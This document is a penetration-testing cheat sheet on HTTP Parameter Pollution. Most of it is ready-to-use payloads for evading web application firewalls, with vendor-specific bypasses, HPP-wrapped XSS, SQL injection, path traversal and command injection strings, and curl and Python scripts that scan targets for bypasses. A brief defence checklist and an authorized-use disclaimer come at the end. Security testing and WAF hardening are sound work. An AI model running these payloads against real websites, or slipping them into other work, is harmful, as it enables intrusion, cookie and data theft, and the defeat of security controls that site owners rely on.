# HTTP Parameter Pollution (HPP) Quick Reference

## 🎯 How Different Technologies Handle Duplicate Parameters

| Technology | Duplicate Handling | Example |
|-----------|-------------------|---------|
| **PHP/Apache** | Uses LAST | `?id=1&id=2` → `id="2"` |
| **ASP.NET/IIS** | Concatenates (comma) | `?id=1&id=2` → `id="1,2"` |
| **JSP/Tomcat** | Uses FIRST | `?id=1&id=2` → `id="1"` |
| **Node.js** | Creates array | `?id=1&id=2` → `id=["1","2"]` |
| **Python/Django** | Uses LAST | `?id=1&id=2` → `id="2"` |

## 🔓 Core Bypass Techniques

### 1️⃣ First-Last Ambiguity
```http
# For PHP/Apache (uses last)
?param=safe&param=<malicious>

# For Tomcat/JSP (uses first)  
?param=<malicious>&param=safe
```

### 2️⃣ Array Notation Confusion
```http
# PHP treats [] as array, WAF may not
?param[]=safe&param[]=<malicious>
?param=safe&param[]=<malicious>
?param[0]=safe&param[1]=<malicious>
```

### 3️⃣ ASP.NET Concatenation
```http
# Splits XSS across params (concatenated with comma)
?input=<script&input=>&input=alert(1)&input=</script>

# SQLi split
?id=1'&id=,UNION&id=,SELECT&id=,NULL--
```

### 4️⃣ Encoding Confusion
```http
# One plain, one encoded
?q=safe&q=%3Cscript%3Ealert(1)%3C/script%3E

# Double encoding
?q=safe&q=%253Cscript%253E

# Case variation
?param=safe&PARAM=<malicious>
```

### 5️⃣ Separator Confusion
```http
# Semicolon as separator
?id=safe;id=<malicious>

# Null byte separator
?id=safe%00&id=<malicious>

# Newline injection
?id=safe%0a&id=<malicious>
```

### 6️⃣ Mixed Method Pollution
```http
POST /api?id=safe HTTP/1.1
Content-Type: application/x-www-form-urlencoded

id=<malicious>
```

### 7️⃣ Sandwich Technique
```http
# Clean-Malicious-Clean
?id=safe&id=<malicious>&id=safe
```

## 🛡️ WAF-Specific Bypasses

### ModSecurity
```http
# Checks first param
?q=safe&q=<script>alert(1)</script>
?q[]=safe&q[]=<script>alert(1)</script>
```

### Cloudflare
```http
# Case-sensitive rules
?id=safe&ID=<script>alert(1)</script>
?id[]=safe&id[]=<script>alert(1)</script>
```

### AWS WAF
```http
# Sandwich technique
?id=safe&id=<script>alert(1)</script>&id=safe
?id=1&id=' UNION SELECT NULL--&id=1
```

### Imperva/Incapsula
```http
# Null byte injection
?param=safe&param%00=<script>alert(1)</script>

# Semicolon separator
?param=safe;param=<script>alert(1)</script>
```

### F5 ASM
```http
# Array notation
?param[0]=safe&param[1]=<script>alert(1)</script>

# Nested arrays
?param.safe=1&param.xss=<script>alert(1)</script>
```

## 🔬 Testing Workflow

### Step 1: Fingerprint Backend
```bash
curl -I https://target.com
# Look for: X-Powered-By, Server, X-AspNet-Version
```

### Step 2: Test Parameter Handling
```bash
curl "https://target.com?test=FIRST&test=LAST"
# Check which value appears in response
```

### Step 3: Identify WAF
```bash
# Send malicious payload
curl "https://target.com?q=<script>alert(1)</script>"
# Note block page to identify WAF vendor
```

### Step 4: Test HPP Bypasses
```bash
# Basic duplication
curl "https://target.com?q=safe&q=<script>alert(1)</script>"

# Array notation
curl "https://target.com?q[]=safe&q[]=<script>alert(1)</script>"

# Encoding
curl "https://target.com?q=safe&q=%3Cscript%3Ealert(1)%3C/script%3E"

# Case variation
curl "https://target.com?q=safe&Q=<script>alert(1)</script>"
```

## 💉 Attack Examples by Type

### XSS (Cross-Site Scripting)
```http
# Basic
?search=safe&search=<script>alert(document.cookie)</script>

# Encoded
?search=safe&search=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E

# Array
?search[]=safe&search[]=<script>alert(1)</script>

# Split (ASP.NET)
?input=<script&input=>&input=alert(1)&input=</script>
```

### SQL Injection
```http
# Basic
?id=1&id=' OR '1'='1

# Encoded
?id=1&id=%27%20OR%20%271%27%3D%271

# Array
?id[]=1&id[]=' OR 1=1--

# Split (ASP.NET)
?id=1'&id=,UNION&id=,SELECT&id=,*&id=,FROM&id=,users--
```

### Path Traversal / LFI
```http
# Basic
?file=safe.txt&file=../../etc/passwd

# Encoded
?file=safe.txt&file=..%2F..%2Fetc%2Fpasswd

# Array
?file[]=safe.txt&file[]=../../etc/passwd
```

### Command Injection
```http
# Basic
?cmd=ping&cmd=;cat /etc/passwd

# Encoded
?cmd=ping&cmd=%3Bcat%20/etc/passwd

# Split (ASP.NET)
?cmd=ping&cmd=;&cmd=cat&cmd=/etc/passwd
```

### Access Control Bypass
```http
# Basic privilege escalation
?user=attacker&admin=false&admin=true

# Role injection
?page=profile&role=user&role=admin

# Tomcat (uses first)
?admin=true&admin=false
```

## 🛠️ Quick Tools

### Burp Suite
1. Capture request → Send to Intruder
2. Add duplicate parameter positions
3. Use Payload Processing for encoding
4. Compare responses

### cURL One-Liners
```bash
# Test all basic techniques
for payload in "safe&q=<xss>" "safe&Q=<xss>" "safe;q=<xss>" "safe%00&q=<xss>"; do
  curl -s "https://target.com?q=$payload" | grep -i "<xss>"
done
```

### Python Quick Test
```python
import requests

target = "https://target.com/search"
techniques = [
    {"q": ["safe", "<script>alert(1)</script>"]},  # Duplicate
    {"q[]": ["safe", "<script>alert(1)</script>"]}, # Array
    {"q": "safe", "Q": "<script>alert(1)</script>"}, # Case
]

for params in techniques:
    r = requests.get(target, params=params)
    if "<script>" in r.text:
        print(f"BYPASS: {params}")
```

## 🔒 Defense Checklist

- [ ] **Reject duplicate parameters** at WAF/application level
- [ ] **Normalize parameters** before security checks
- [ ] **Validate ALL occurrences** if duplicates allowed
- [ ] **Consistent parsing** between WAF and backend
- [ ] **Parameter allowlists** (not blocklists)
- [ ] **Disable parameter merging** (GET/POST/COOKIE)
- [ ] **Set framework limits** (PHP: `max_input_vars`, ASP.NET: `MaxHttpCollectionKeys`)
- [ ] **WAF configuration** to check all parameter occurrences
- [ ] **Logging & monitoring** for duplicate parameters
- [ ] **Regular testing** with HPP payloads

## 📊 Parameter Handling Matrix

| Backend | WAF Checks | Backend Uses | Bypass Strategy |
|---------|-----------|--------------|-----------------|
| PHP | First param | Last param | Place malicious last |
| Tomcat | Last param | First param | Place malicious first |
| ASP.NET | Split check | Concatenates | Split payload across params |
| Node.js | First item | Array | Mix notations |

## 🚨 Red Flags in Code

### Vulnerable PHP
```php
// BAD - No duplicate check
$id = $_GET['id'];
```

### Vulnerable ASP.NET
```csharp
// BAD - Concatenates without validation
string id = Request["id"];
```

### Vulnerable Python
```python
# BAD - No duplicate check
id = request.GET['id']
```

### Secure Implementation
```python
# GOOD - Reject duplicates
def get_param(request, key):
    values = request.GET.getlist(key)
    if len(values) > 1:
        raise ValueError("Duplicate parameters not allowed")
    return values[0] if values else None
```

## 📚 Quick Reference Commands

```bash
# Fingerprint
curl -I target.com | grep -E "Server|X-Powered-By|X-AspNet"

# Test handling
curl "target.com?test=A&test=B" -s | grep -oE "(A|B|A,B)"

# Identify WAF
curl "target.com?q=<script>alert(1)</script>" -I | grep -i "403\|406"

# Test bypass
curl "target.com?q=safe&q=<xss>" --trace-ascii -
```

---

**⚠️ USE ONLY ON AUTHORIZED TARGETS**

This cheatsheet is for authorized security testing and educational purposes only.
